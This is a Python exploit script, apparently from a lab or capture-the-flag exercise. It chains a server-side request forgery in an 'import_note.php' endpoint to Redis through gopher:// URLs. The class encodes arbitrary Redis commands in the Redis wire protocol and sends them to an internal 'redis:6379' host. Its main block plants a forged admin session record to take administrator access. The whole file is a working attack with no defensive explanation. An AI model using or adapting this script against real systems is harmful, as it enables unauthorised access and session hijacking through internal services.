import urllib.parse
import requests

class RedisInjector:
    def __init__(self, ssrf_endpoint):
        self.ssrf_endpoint = ssrf_endpoint

    def _redis_protocol(self, command: str) -> str:
        parts = command.split()
        proto = f"*{len(parts)}\r\n"
        for p in parts:
            proto += f"${len(p)}\r\n{p}\r\n"
        return proto

    def build_gopher_payload(self, redis_commands):
        payload = ""
        for cmd in redis_commands:
            payload += self._redis_protocol(cmd)
        return urllib.parse.quote(payload)

    def inject(self, redis_commands):
        payload = self.build_gopher_payload(redis_commands)
        gopher_url = f"gopher://redis:6379/_{payload}"

        r = requests.get(
            self.ssrf_endpoint,
            params={"url": gopher_url},
            timeout=5
        )

        return r.status_code == 200


if __name__ == "__main__":
    injector = RedisInjector("http://localhost:8080/import_note.php")

    cmds = [
        'SET session:admin_from_ssrf {"user":"admin","role":"admin"}'
    ]

    success = injector.inject(cmds)

    if success:
        print("[+] Redis injection successful")
    else:
        print("[-] Injection failed")
